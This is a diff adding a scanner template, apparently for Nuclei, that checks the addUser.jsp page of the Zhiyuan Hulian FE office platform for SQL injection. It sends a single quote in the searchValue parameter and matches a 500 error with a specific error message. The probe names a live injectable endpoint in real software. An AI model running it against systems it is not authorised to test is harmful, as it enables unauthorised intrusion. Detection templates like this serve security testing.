@@ -1,0 +1,27 @@
+id: zhiyuanhulian-FE-addUser-sql
+
+info:
+  name: 致远互联FE协作办公平台 addUser.jsp SQL注入
+  author: HuanXiong
+  severity: high
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /security/addUser.jsp?searchValue=1' HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Content-Length: 4
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '点击关闭，重新操作！'
+      - type: status
+        status:
+          - 500
